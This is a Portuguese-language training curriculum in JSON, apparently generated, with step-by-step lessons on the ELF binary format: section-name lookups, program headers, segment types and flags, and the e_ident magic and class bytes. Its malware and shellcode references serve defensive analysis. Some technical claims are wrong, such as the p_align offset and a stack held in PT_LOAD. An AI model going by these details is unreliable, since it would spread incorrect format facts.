                              "practicalExample": "Em um binário ELF como /bin/ls: use readelf -S para ver sh_name=1 para .text (offset 1 na .shstrtab), sh_link=1 (.shstrtab índice 1). Hexdump .shstrtab +1 revela '.text\\x00'. Siga sh_link da .symtab (ex: link=5 para .strtab) e extraia símbolos.",
                              "finalVerifications": [
                                "Extrair nomes de todas as seções via sh_name offsets sem erros.",
                                "Identificar corretamente a .shstrtab via sh_link de múltiplas seções.",
                                "Mapear pelo menos 5 relacionamentos sh_link → seção dependente.",
                                "Validar extrações com readelf e hexdump.",
                                "Criar script que lista nomes e links automaticamente.",
                                "Detectar seções sem nomes (sh_name=0)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de offsets e strings (100% match com readelf).",
                                "Compreensão de sh_link além de nomes (relacionamentos corretos).",
                                "Eficiência: tempo <2h para mapeamento completo de ELF médio.",
                                "Automação: script funcional para parsing.",
                                "Análise de erros: identificar e corrigir common mistakes.",
                                "Documentação clara de passos e descobertas."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: parsing binários com struct ELF.",
                                "Análise de Malware: mapeamento de seções em amostras maliciosas.",
                                "Sistemas Operacionais: loaders ELF e linkers dinâmicos.",
                                "Engenharia Reversa: ferramentas como Ghidra/IDA Pro.",
                                "Criptografia: verificação de integridade de seções nomeadas."
                              ],
                              "realWorldApplication": "Em análise forense digital e reverse engineering, permite mapear estruturas de binários ELF para detectar injeções de código em seções como .text ou .plt, essencial em hunts de malware e auditorias de segurança de software."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.3",
                        "name": "Segmentos no Formato ELF (Segments)",
                        "description": "Unidades de carregamento em memória, mapeadas diretamente pelo kernel, definidas pela Tabela de Cabeçalhos de Programa, diferenciando-se das seções por foco em runtime.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.3.1",
                            "name": "Compreender a Tabela de Cabeçalhos de Programa (Program Header Table)",
                            "description": "Analisar a estrutura com entradas de 32 ou 56 bytes, campos como p_type (PT_LOAD, PT_DYNAMIC), p_offset, p_vaddr e p_memsz, usando readelf -l.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito e Propósito da Program Header Table (PHT)",
                                  "subSteps": [
                                    "Leia a documentação oficial do ELF sobre a seção de Program Headers.",
                                    "Identifique que a PHT descreve segmentos de memória para carregamento dinâmico.",
                                    "Note que o número de entradas é definido por e_phnum no ELF Header.",
                                    "Diferencie PHT de Section Header Table (SHT).",
                                    "Entenda tamanhos: 32 bytes para ELF32, 56 bytes para ELF64."
                                  ],
                                  "verification": "Explique em suas palavras o papel da PHT no processo de carregamento de um executável ELF.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação ELF oficial (elf.h ou man elf)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Visualize a PHT como um 'mapa' que o linker e loader usam para mapear o binário na memória.",
                                  "learningObjective": "Compreender o propósito e localização da PHT no formato ELF.",
                                  "commonMistakes": [
                                    "Confundir PHT com SHT",
                                    "Ignorar diferenças entre ELF32 e ELF64"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar e Analisar a Estrutura de uma Entrada de Program Header",
                                  "subSteps": [
                                    "Liste os campos principais: p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align.",
                                    "Estude significados: p_type (PT_LOAD=1, PT_DYNAMIC=2, PT_INTERP=3, etc.).",
                                    "Compare p_filesz (tamanho no arquivo) vs p_memsz (tamanho na memória).",
                                    "Analise p_offset (posição no arquivo) e p_vaddr (endereço virtual).",
                                    "Pratique desenhando um diagrama da estrutura para ELF64 (56 bytes)."
                                  ],
                                  "verification": "Desenhe e rotule corretamente a estrutura de uma entrada ELF64 Program Header.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "elf.h header file",
                                    "Diagrama impresso ou digital da estrutura ELF"
                                  ],
                                  "tips": "Use hexdump ou um editor hex para visualizar bytes reais após aprender readelf.",
                                  "learningObjective": "Dominar os campos e seus significados em uma entrada de PHT.",
                                  "commonMistakes": [
                                    "Confundir p_vaddr com p_paddr",
                                    "Esquecer que p_align deve ser potência de 2"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Usar readelf para Visualizar a PHT em um Binário Real",
                                  "subSteps": [
                                    "Instale binutils se necessário (apt install binutils).",
                                    "Execute 'readelf -l /bin/ls' e identifique a seção 'Program Headers'.",
                                    "Conte o número de entradas e compare com e_phnum via 'readelf -h'.",
                                    "Analise um PT_LOAD: note p_offset, p_vaddr, p_filesz, p_memsz.",
                                    "Identifique outros tipos como PT_DYNAMIC ou PT_INTERP."
                                  ],
                                  "verification": "Rode readelf -l em um binário e aponte 3 entradas com seus p_type corretos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário ELF como /bin/ls ou hello world compilado",
                                    "Terminal com readelf"
                                  ],
                                  "tips": "Use 'readelf -l --wide' para saída mais legível em entradas longas.",
                                  "learningObjective": "Aplicar readelf para extrair e interpretar dados da PHT.",
                                  "commonMistakes": [
                                    "Rodar readelf em arquivos não-ELF",
                                    "Ignorar endianness em cross-compilation"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e Correlacionar Campos da PHT com Segmentos de Memória",
                                  "subSteps": [
                                    "Para uma entrada PT_LOAD, calcule o tamanho do segmento (p_memsz).",
                                    "Verifique alinhamentos: p_vaddr % p_align == 0.",
                                    "Compare múltiplas entradas PT_LOAD para entender sobreposição de código/dados.",
                                    "Use 'readelf -d' para dynamic section e correlacione com PT_DYNAMIC.",
                                    "Simule carregamento: imagine mmap com p_offset e p_vaddr."
                                  ],
                                  "verification": "Interprete uma saída readelf -l completa, explicando 2-3 entradas em detalhes.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Saída salva de readelf -l",
                                    "Calculadora ou script Python para alinhamentos"
                                  ],
                                  "tips": "Binários estáticos têm menos entradas; use dinâmicos para variedade.",
                                  "learningObjective": "Interpretar inter-relações entre campos da PHT e comportamento de runtime.",
                                  "commonMistakes": [
                                    "Assumir p_filesz sempre == p_memsz",
                                    "Não notar flags de leitura/execução"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um 'hello world' em C: gcc -o hello hello.c. Rode 'readelf -l hello'. Analise a entrada PT_LOAD principal: note p_offset=0x0, p_vaddr=0x400000, p_filesz=~1KB, p_memsz=~1KB, p_flags=r-xp (leitura/execução). Explique como o loader usa isso para mapear .text na memória.",
                              "finalVerifications": [
                                "Lista corretamente todos os campos principais de uma entrada PHT ELF64.",
                                "Interpreta saída de readelf -l para qualquer binário ELF comum.",
                                "Diferencia PT_LOAD de PT_DYNAMIC com exemplos reais.",
                                "Calcula corretamente alinhamentos e tamanhos de segmentos.",
                                "Explica o impacto de p_flags no mapeamento de memória.",
                                "Identifica e_phoff e e_phentsize do ELF Header."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de campos (100% dos principais corretos).",
                                "Capacidade de interpretar readelf sem erros em 3+ entradas.",
                                "Explicação clara de diferenças ELF32 vs ELF64.",
                                "Demonstração de correlações entre PHT e carregamento dinâmico.",
                                "Identificação de erros comuns em interpretações de amostras.",
                                "Uso correto de terminologia ELF padrão."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender linkage e seções de memória.",
                                "Segurança Computacional: Análise para detecção de binários maliciosos (ex: shellcode em PT_LOAD).",
                                "Sistemas Operacionais: Mecanismos de loader do kernel (execve).",
                                "Engenharia Reversa: Base para ferramentas como objdump ou IDA Pro.",
                                "Redes: Análise de binários em forensics de malware."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, analise a PHT para identificar segmentos injetados ou tamanhos suspeitos; em debugging de crashes, verifique desalinhamentos de p_vaddr; desenvolvedores usam para otimizar binários estáticos vs dinâmicos em embedded systems."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.2",
                            "name": "Diferenciar seções de segmentos e tipos comuns (PT_LOAD, PT_INTERP)",
                            "description": "Explicar como múltiplas seções são agrupadas em segmentos para carregamento eficiente, identificando segmentos executáveis, de dados e interpretador.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos básicos de seções e segmentos no formato ELF",
                                  "subSteps": [
                                    "Estude a definição de seções: unidades lógicas no arquivo ELF usadas pelo linker (.text, .data, .bss, etc.)",
                                    "Analise o propósito das seções: armazenamento de código, dados e metadados para linking e debugging",
                                    "Entenda segmentos: agrupamentos de seções adjacentes para carregamento eficiente pelo kernel",
                                    "Compare: seções são granulares (múltiplas por segmento), segmentos são para runtime (executáveis, dados)",
                                    "Visualize com diagrama: seções dentro de segmentos no layout do arquivo ELF"
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras diferenciando seções e segmentos, citando exemplos de seções comuns",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação oficial ELF (elf(5)), ferramenta readelf, editor de texto",
                                  "tips": "Pense em seções como 'caixas pequenas' e segmentos como 'caixas grandes' que as agrupam para transporte (carregamento)",
                                  "learningObjective": "Diferenciar conceitualmente seções (link-time) de segmentos (load-time) no ELF",
                                  "commonMistakes": "Confundir seções com segmentos, achando que são sinônimos ou que segmentos são apenas código executável"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar a estrutura do Program Header Table (PHT)",
                                  "subSteps": [
                                    "Localize o ELF Header e identifique o campo e_phoff (offset do PHT) e e_phnum (número de entradas)",
                                    "Descreva a estrutura de cada entrada de programa: p_type, p_flags, p_offset, p_vaddr, p_filesz, p_memsz, etc.",
                                    "Use readelf -l para visualizar o PHT de um binário ELF simples",
                                    "Interprete campos chave: p_type define o tipo, p_flags (PF_X, PF_W, PF_R) definem permissões",
                                    "Mapeie como seções são agrupadas em segmentos via p_offset e tamanhos"
                                  ],
                                  "verification": "Execute readelf -l em um binário e anote 3 entradas de PHT com seus p_type e flags",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Comando readelf instalado, binário ELF exemplo (/bin/ls), terminal",
                                  "tips": "Lembre-se: PHT é carregado pelo kernel para mapear memória; Section Header Table (SHT) é para tools como linker",
                                  "learningObjective": "Interpretar o Program Header Table e mapear seções a segmentos",
                                  "commonMistakes": "Ignorar alinhamentos (p_align) ou confundir p_filesz com p_memsz (para BSS-like)"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e diferenciar tipos comuns de segmentos (PT_LOAD, PT_INTERP)",
                                  "subSteps": [
                                    "Liste tipos comuns: PT_NULL, PT_LOAD (carregável), PT_DYNAMIC (tabela dinâmica), PT_INTERP (interpretador)",
                                    "Detalhe PT_LOAD: segmentos executáveis (flags PF_X) e de dados (PF_W), múltiplos para texto/dados/stack",
                                    "Explique PT_INTERP: aponta para string como '/lib64/ld-linux-x86-64.so.2' para dynamic loader",
                                    "Compare: PT_LOAD agrupa múltiplas seções (.text+.rodata, .data+.bss), PT_INTERP é singleton",
                                    "Verifique com readelf: identifique PT_LOAD (vários) vs PT_INTERP (um)"
                                  ],
                                  "verification": "Classifique os segmentos de um binário: quantos PT_LOAD, qual PT_INTERP, e suas funções",
                                  "estimatedTime": "40 minutos",
                                  "materials": "readelf, binários ELF variados (estático vs dinâmico), documentação elf.h",
                                  "tips": "PT_LOAD é o 'coração' do carregamento; PT_INTERP é essencial para binários dinâmicos",
                                  "learningObjective": "Reconhecer e explicar PT_LOAD (executável/dados) e PT_INTERP (interpretador)",
                                  "commonMistakes": "Achar que todo segmento é PT_LOAD ou ignorar PT_INTERP em análise de dependências"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o conhecimento em análise prática de um binário ELF",
                                  "subSteps": [
                                    "Execute readelf -l -S em um binário para ver PHT e SHT lado a lado",
                                    "Mapeie seções para segmentos: ex. .text em PT_LOAD com PF_X",
                                    "Identifique agrupamentos: múltiplas seções de rodata/dados em um PT_LOAD",
                                    "Simule carregamento: explique como kernel usa PT_LOAD para mmap e PT_INTERP para loader",
                                    "Teste modificação: altere PT_INTERP com hex editor e observe falha no ld.so"
                                  ],
                                  "verification": "Crie um diagrama manual mapeando 5 seções a 2-3 segmentos em um binário real",
                                  "estimatedTime": "50 minutos",
                                  "materials": "readelf, objdump, hex editor (xxd ou bless), binário /bin/ls",
                                  "tips": "Use readelf -Wl para headers alinhados; pratique com binários estáticos (sem PT_INTERP)",
                                  "learningObjective": "Analisar binários reais diferenciando seções/segmentos e tipos PT_*",
                                  "commonMistakes": "Não alinhar offsets corretamente ou ignorar flags de permissão nos PT_LOAD"
                                }
                              ],
                              "practicalExample": "Execute 'readelf -l /bin/ls' em um sistema Linux. Observe: PT_INTERP apontando para o dynamic loader, múltiplos PT_LOAD (um para .text/.rodata com PF_X|PF_R, outro para .data/.bss com PF_W|PF_R). Compare com 'readelf -S /bin/ls' para ver seções agrupadas nesses segmentos, como .text no primeiro PT_LOAD.",
                              "finalVerifications": [
                                "Explicar verbalmente a diferença entre seções e segmentos com exemplos",
                                "Identificar PT_LOAD e PT_INTERP em qualquer saída de readelf -l",
                                "Mapear pelo menos 3 seções a segmentos em um binário dado",
                                "Descrever o papel do PT_INTERP no processo de carregamento dinâmico",
                                "Prever permissões de memória baseadas em flags de PT_LOAD",
                                "Diferenciar binário estático (sem PT_INTERP) de dinâmico"
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: distinção clara entre seções (SHT) e segmentos (PHT)",
                                "Conhecimento de tipos: explicação correta de PT_LOAD (múltiplos, carregáveis) e PT_INTERP (loader)",
                                "Análise prática: mapeamento correto em readelf/objdump",
                                "Profundidade: menção a flags, alinhamentos e tamanhos (filesz/memsz)",
                                "Aplicação: ligação com carregamento eficiente pelo kernel",
                                "Clareza: diagramas ou resumos visuais sem erros"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de carregamento de processos e mmap",
                                "Segurança Computacional: Análise de binários em reverse engineering e detecção de malware",
                                "Arquitetura de Computadores: Alinhamento de memória e permissões (NX bit via PF_X)",
                                "Programação em Assembly: Entendimento de layout de binários para debugging",
                                "Redes e Criptografia: Inspeção de binários em análise de vulnerabilidades"
                              ],
                              "realWorldApplication": "Em análise forense digital e segurança cibernética, diferenciar seções/segmentos permite identificar payloads maliciosos em ELF (ex: shellcode em PT_LOAD não padrão) ou loaders falsos em PT_INTERP para rootkits, facilitando dissecação de malware Linux como em incidentes de APTs."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.3",
                            "name": "Interpretar flags e alinhamentos de segmentos (p_flags, p_align)",
                            "description": "Avaliar permissões (read, write, execute) via flags e alinhamentos de página para prever comportamento em memória durante execução.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Extrair Campos p_flags e p_align de um Header de Segmento ELF",
                                  "subSteps": [
                                    "Use a ferramenta readelf para exibir os headers de programa de um arquivo ELF com o comando 'readelf -l arquivo.elf'.",
                                    "Identifique a seção 'Program Headers' e localize as colunas correspondentes a 'PFLAGS' (p_flags) e 'PADDR' ou 'ALIGN' (relacionado a p_align).",
                                    "Anote os valores hexadecimais de p_flags (ex: 0x5) e p_align (ex: 0x1000) para um segmento específico.",
                                    "Consulte a documentação ELF (man elf) para confirmar os offsets exatos no struct Elf64_Phdr: p_flags em offset 4, p_align em offset 32.",
                                    "Extraia manualmente usando um hex editor como xxd ou hexdump para validar."
                                  ],
                                  "verification": "Confirme que os valores extraídos correspondem à saída de readelf e manuais de referência ELF.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta readelf, arquivo ELF de exemplo (ex: /bin/ls), hex editor (xxd), documentação ELF",
                                  "tips": "Sempre compare saídas de ferramentas com dumps hex para compreensão profunda.",
                                  "learningObjective": "Localizar precisamente os campos p_flags e p_align em headers de segmentos ELF.",
                                  "commonMistakes": "Confundir headers de seção (sh_flags) com headers de programa (p_flags); ignorar endianness em dumps hex."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Decodificar p_flags para Identificar Permissões de Memória (R, W, X)",
                                  "subSteps": [
                                    "Converta p_flags para binário: bits 0=PF_X (execute), 1=PF_W (write), 2=PF_R (read). Ex: 0x5 (101 binário) = R+X.",
                                    "Mapeie valores comuns: 0x4=Read-only, 0x5=Read+Execute (código), 0x6=Read+Write (dados), 0x7=Read+Write+Execute (raro, perigoso).",
                                    "Use bitwise AND para verificar: p_flags & 0x4 para PF_R, &0x2 para PF_W, &0x1 para PF_X.",
                                    "Analise múltiplos segmentos: code tipicamente RX, data RW.",
                                    "Teste com script Python usando struct.unpack para parsear headers."
                                  ],
                                  "verification": "Escreva uma tabela resumindo flags decodificadas para todos segmentos de um ELF e valide com objdump -p.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Calculadora binária/hex, Python com struct module, objdump, arquivo ELF",
                                  "tips": "Lembre-se: permissões definem como mmap() mapeia o segmento em memória virtual.",
                                  "learningObjective": "Interpretar bits de p_flags para determinar permissões read/write/execute.",
                                  "commonMistakes": "Invertendo bits (PF_X é bit 0, não o mais significativo); assumindo flags como strings em vez de masks binárias."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar p_align e Calcular Alinhamentos de Página em Memória",
                                  "subSteps": [
                                    "Entenda p_align como potência de 2 (ex: 0x1000=4KB, padrão de página x86_64).",
                                    "Calcule endereço virtual alinhado: p_vaddr deve ser múltiplo de p_align; senão, ajuste durante load.",
                                    "Verifique com readelf -l: coluna 'OFF' e 'VADDR' devem respeitar p_align para mapeamento eficiente.",
                                    "Simule mapeamento: endereço final = roundup(p_vaddr, p_align), usando fórmulas como ((addr + align - 1) / align) * align.",
                                    "Compare com páginas de SO: misalignments causam overhead ou falhas em mmap."
                                  ],
                                  "verification": "Calcule alinhamentos para 3 segmentos e confirme que p_vaddr % p_align == 0 ou ajuste correto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Calculadora, readelf, gdb para inspecionar /proc/<pid>/maps de processo carregado",
                                  "tips": "p_align=0 significa sem alinhamento específico; foque em 0x1000 ou 0x200000 para grandes páginas.",
                                  "learningObjective": "Calcular e prever alinhamentos de memória baseados em p_align.",
                                  "commonMistakes": "Tratar p_align como offset fixo em vez de máscara de alinhamento; ignorar arquiteturas ARM (páginas 64KB)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Prever Comportamento em Memória e Implicações de Segurança",
                                  "subSteps": [
                                    "Combine flags+align: RX com 4KB=texto executável alinhado; RW misaligned=pilha/dados vulneráveis.",
                                    "Simule execução: use gdb para carregar ELF e 'info proc mappings' para ver mapeamentos reais.",
                                    "Identifique riscos: W+X=potencial shellcode; align pequeno=fragments em TLB.",
                                    "Avalie ASLR/DEP: flags influenciam se NX bit é set (no-execute).",
                                    "Crie relatório: 'Este segmento RX@0x400000 (4KB align) é código estático seguro.'"
                                  ],
                                  "verification": "Gere relatório preditivo e valide breakpoints gdb em endereços previstos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "gdb, arquivo ELF, strace para rastrear mmap calls durante execução",
                                  "tips": "Execute 'ldd' ou 'strace ./elf' para ver loads dinâmicos afetados por flags.",
                                  "learningObjective": "Prever mapeamento em memória e riscos de segurança de segmentos ELF.",
                                  "commonMistakes": "Ignorar relocações dinâmicas que alteram vaddrs; superestimar flags sem contexto de loader."
                                }
                              ],
                              "practicalExample": "Em /bin/ls (ELF x86_64), segmento INTERP: p_flags=0x4 (R), p_align=1; LOAD code: p_flags=0x5 (RX), p_align=0x1000. Isso prevê mapeamento em 0x400000 (alinhado 4KB, read+exec apenas), impedindo writes em código para mitigar exploits como buffer overflow.",
                              "finalVerifications": [
                                "Lista corretamente permissões (R/W/X) para todos segmentos de um ELF via readelf.",
                                "Calcula alinhamentos precisos de p_vaddr baseado em p_align.",
                                "Prediz mapeamentos em /proc/pid/maps via gdb ou strace.",
                                "Identifica segmentos W+X como riscos de segurança.",
                                "Valida predições com dump de memória real durante execução.",
                                "Explica impacto de flags em proteções como DEP/NX."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de p_flags (100% bits corretos).",
                                "Cálculos de alinhamento sem erros matemáticos.",
                                "Relatório preditivo coerente com ferramentas de validação.",
                                "Identificação de 80%+ riscos de segurança baseados em flags/align.",
                                "Explicação clara de implicações em runtime (mmap behavior).",
                                "Uso correto de ferramentas sem dependências erradas."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entendimento de virtual memory e mmap syscalls.",
                                "Arquitetura de Computadores: Páginas/TLB e alinhamentos de cache.",
                                "Programação em Assembly: Acesso a memória com restrições R/W/X.",
                                "Segurança de Software: Mitigações como W^X policy e ASLR."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, analise flags de binários ELF para detectar injeções shellcode (W+X segments) ou evasões de sandbox (misalignments); ferramentas como IDA Pro ou Ghidra usam isso para análise estática pré-execução."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.2",
                    "name": "Cabeçalho ELF e Identificadores",
                    "description": "Detalhes do cabeçalho ELF (e_ident, e_type, e_machine), usados para identificação e compatibilidade.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.2.1",
                        "name": "e_ident - Identificador Mágico e Metadados ELF",
                        "description": "O campo e_ident é um array de 16 bytes no início do cabeçalho ELF que contém o magic number, classe do arquivo (32 ou 64 bits), codificação de dados (endianness), versão e ABI/OS, essenciais para validar e interpretar o formato do binário.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.1.1",
                            "name": "Identificar o Magic Number ELF",
                            "description": "Reconhecer a sequência de bytes 0x7F seguido de 'ELF' (0x45 4C 46) nos primeiros 4 bytes do e_ident para confirmar que o arquivo é um ELF válido e distinguir de outros formatos como PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura do Magic Number ELF",
                                  "subSteps": [
                                    "Estude a definição do e_ident no cabeçalho ELF: os primeiros 16 bytes contendo metadados.",
                                    "Memorize os bytes do Magic Number: byte 0: 0x7F (EI_MAG0), byte 1: 0x45 ('E'), byte 2: 0x4C ('L'), byte 3: 0x46 ('F') (EI_MAG3).",
                                    "Aprenda que esses bytes confirmam a validade ELF e distinguem de outros formatos.",
                                    "Revise a especificação ELF oficial para contexto adicional sobre e_ident.",
                                    "Anote os valores em decimal e ASCII para reforço visual."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito os 4 bytes exatos e seu propósito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Especificação ELF (padrão System V ABI)",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": "Use uma tabela para mapear índice, hex, ASCII e significado.",
                                  "learningObjective": "Entender precisamente o que constitui o Magic Number ELF e sua localização no e_ident.",
                                  "commonMistakes": [
                                    "Confundir com assinatura PE (MZ ou PE\\x00\\x00).",
                                    "Ignorar o byte inicial 0x7F como separador mágico.",
                                    "Assumir que ELF sempre começa com texto legível."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar Ferramentas para Inspeção de Binários",
                                  "subSteps": [
                                    "Instale ferramentas como hexdump, xxd ou hex editor (ex: bless, hexedit).",
                                    "Baixe amostras de arquivos ELF válidos (ex: /bin/ls no Linux).",
                                    "Obtenha um arquivo PE para comparação (ex: notepad.exe do Windows).",
                                    "Configure um ambiente seguro como VM Linux para análise.",
                                    "Teste comandos básicos: `xxd arquivo.elf | head -1` para visualizar primeiros bytes."
                                  ],
                                  "verification": "Execute o comando em um ELF e confirme visualização dos primeiros 16 bytes.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Linux VM ou WSL",
                                    "Arquivos de amostra ELF e PE",
                                    "xxd ou hexdump (padrão no Unix)"
                                  ],
                                  "tips": "Sempre use `head -1` ou limite linhas para focar no cabeçalho.",
                                  "learningObjective": "Dominar ferramentas essenciais para examinar bytes hex de binários.",
                                  "commonMistakes": [
                                    "Usar editores binários sem modo hex.",
                                    "Executar binários desconhecidos sem sandbox.",
                                    "Confundir endianness ao ler manualmente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar o Magic Number em Arquivos ELF",
                                  "subSteps": [
                                    "Abra um arquivo ELF com xxd/hexdump e isole os primeiros 4 bytes.",
                                    "Compare: confirme 7F 45 4C 46 exatamente.",
                                    "Registre os bytes em uma tabela: posição, valor hex, ASCII.",
                                    "Repita com 3 arquivos ELF diferentes para prática.",
                                    "Documente achados em um relatório simples."
                                  ],
                                  "verification": "Mostre screenshot ou saída do comando destacando os 4 bytes corretos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "3 arquivos ELF de amostra (ls, cat, echo)",
                                    "xxd ou hexdump"
                                  ],
                                  "tips": "Procure por 'ELF' em ASCII após o 7F para confirmação rápida.",
                                  "learningObjective": "Reconhecer visual e programaticamente o Magic Number ELF.",
                                  "commonMistakes": [
                                    "Ler bytes errados (ex: ignorar offset 0).",
                                    "Confundir maiúsculas/minúsculas em 'ELF'.",
                                    "Não validar contra corrupção de arquivo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Distinguir ELF de Outros Formatos como PE",
                                  "subSteps": [
                                    "Examine um arquivo PE: confirme ausência de 7F ELF (em vez disso, MZ: 4D 5A).",
                                    "Compare lado a lado saídas hex de ELF vs PE.",
                                    "Identifique assinatura PE (50 45 00 00 após offset).",
                                    "Teste com arquivo híbrido ou inválido para edge cases.",
                                    "Crie um checklist para identificação rápida de formatos."
                                  ],
                                  "verification": "Classifique corretamente 5 arquivos mistos (3 ELF, 2 PE/outros).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Arquivos PE (ex: .exe Windows)",
                                    "Amostras mistas",
                                    "Hex editor para edição manual"
                                  ],
                                  "tips": "MZ é 'Magic' para DOS, PE segue; ELF é puro Unix-like.",
                                  "learningObjective": "Diferenciar formatos executáveis pelo magic number inicial.",
                                  "commonMistakes": [
                                    "Assumir todos os binários Linux são ELF.",
                                    "Ignorar arquivos compactados ou multi-formato.",
                                    "Não checar endianness ou arquitetura."
                                  ]
                                }
                              ],
                              "practicalExample": "Execute `xxd /bin/ls | head -1` em um sistema Linux: saída mostra '7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00' confirmando Magic Number ELF válido.",
                              "finalVerifications": [
                                "Os primeiros 4 bytes são exatamente 0x7F, 0x45, 0x4C, 0x46.",
                                "Distinção clara de PE (inicia com 0x4D 0x5A).",
                                "Identificação consistente em múltiplos ELF de 32/64-bit.",
                                "Checklist de verificação aplicada corretamente.",
                                "Nenhum falso positivo em arquivos não-ELF."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 100% correto em 5 amostras.",
                                "Tempo de análise < 2 min por arquivo.",
                                "Relatório inclui bytes hex, ASCII e explicação.",
                                "Demonstra distinção de PE com evidências.",
                                "Uso correto de ferramentas sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entendendo loaders de executáveis.",
                                "Programação em C: Implementando parsers de cabeçalho ELF.",
                                "Segurança da Informação: Detecção de binários maliciosos por formato.",
                                "Redes: Análise de payloads em tráfego (ex: ELF em Linux malware).",
                                "Engenharia Reversa: Primeiros passos em dissecação de binários."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar Magic Number ELF permite triagem rápida de amostras Linux, direcionando para ferramentas como readelf/objdump vs PE tools como CFF Explorer, essencial em equipes SOC para resposta a incidentes cross-platform."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.2",
                            "name": "Interpretar ei_class e ei_data",
                            "description": "Analisar o byte ei_class (valor 1 para 32 bits, 2 para 64 bits) e ei_data (1 para little-endian, 2 para big-endian) para determinar a largura de endereço e ordem de bytes, impactando a leitura correta do resto do cabeçalho.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Significados de ei_class e ei_data no Cabeçalho ELF",
                                  "subSteps": [
                                    "Estude a estrutura do array e_ident no cabeçalho ELF, focando nos offsets EI_CLASS (índice 4) e EI_DATA (índice 5).",
                                    "Memorize os valores: ei_class = 1 (ELFCLASS32 para 32 bits), 2 (ELFCLASS64 para 64 bits).",
                                    "Memorize os valores: ei_data = 1 (ELFDATA2LSB para little-endian), 2 (ELFDATA2MSB para big-endian).",
                                    "Explique verbalmente como esses bytes afetam a interpretação do resto do cabeçalho.",
                                    "Compare com formatos não-ELF para contextualizar a importância."
                                  ],
                                  "verification": "Liste corretamente os valores e significados de ei_class e ei_data em um documento ou quiz.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação ELF oficial (man elf), diagrama do cabeçalho ELF.",
                                  "tips": "Use mnemônicos: '1 para 32, 2 para 64'; '1 little (baixo primeiro), 2 big (alto primeiro)'.",
                                  "learningObjective": "Identificar precisamente o que ei_class e ei_data representam na arquitetura ELF.",
                                  "commonMistakes": "Confundir ei_class com tamanho de dados (é largura de endereço); inverter little/big endian."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e Extrair os Bytes ei_class e ei_data de um Arquivo ELF",
                                  "subSteps": [
